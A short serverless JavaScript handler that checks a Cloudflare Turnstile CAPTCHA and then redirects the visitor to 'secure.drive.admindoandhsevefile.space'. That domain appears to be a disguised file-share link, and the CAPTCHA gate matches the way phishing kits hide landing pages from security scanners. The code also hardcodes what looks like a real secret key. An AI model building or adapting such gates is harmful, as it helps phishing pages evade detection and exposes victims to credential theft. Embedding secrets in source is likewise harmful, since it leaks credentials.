export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).send('Method Not Allowed');
  }

  const token = req.body['cf-turnstile-response'];
  const secret = '0x4AAAAAABbs53vI2-31uSYvjF7tov1KMlA'; // Replace with your actual Cloudflare secret key

  const verifyRes = await fetch('https://challenges.cloudflare.com/turnstile/v0/siteverify', {
    method: 'POST',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: `secret=${secret}&response=${token}`,
  });

  const data = await verifyRes.json();

  if (data.success) {
    // 🔁 This is how we trigger a redirect from server
    res.writeHead(302, { Location: 'https://secure.drive.admindoandhsevefile.space/hKYUcWCu' });
    res.end();
  } else {
    res.status(401).json({ error: 'Captcha verification failed' });
  }
}
